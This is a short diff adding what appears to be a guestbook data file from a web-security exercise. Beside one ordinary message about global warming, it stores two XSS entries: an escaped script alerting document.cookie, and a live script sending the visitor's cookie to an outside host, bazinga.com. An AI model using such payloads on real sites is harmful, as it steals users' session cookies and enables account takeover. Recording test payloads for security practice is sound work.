@@ -1,0 +1,4 @@
+Emre*divide*Global warming is the increase of Earth's average surface temperature due to greenhouse gases that collect in the atmosphere like a thickening blanket, trapping the sun's heat and causing the planet to warm up
+Attacker*divide*&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+Sheldon*divide*<script>location.href="http://bazinga.com/hack_xss_reflected.php?victim_data="+document.cookie</script>&Ara=Gönder
+
